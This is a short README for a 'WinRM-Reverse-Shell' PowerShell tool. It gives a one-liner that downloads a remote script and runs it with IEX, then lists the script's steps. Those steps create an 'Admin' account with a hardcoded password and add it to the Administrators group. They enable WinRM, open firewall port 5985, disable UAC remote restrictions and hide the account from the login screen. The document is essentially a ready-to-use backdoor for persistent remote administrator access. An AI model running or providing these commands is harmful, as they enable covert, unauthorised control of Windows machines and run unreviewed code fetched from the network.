# WinRM-Reverse-Shell

# Powershell One liner with administrator permissions
`IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")`

# Script into pieces
## Create a new local user account
$Username = "`Admin`"
$Password = ConvertTo-SecureString "`Password1`" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

## Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

## Enable Windows Remote Management (WinRM)
Enable-PSRemoting -Force

## Add a firewall rule to allow WinRM traffic
New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

## Disable UAC remote restrictions
+ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
+ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force

## Exit PowerShell session
Exit
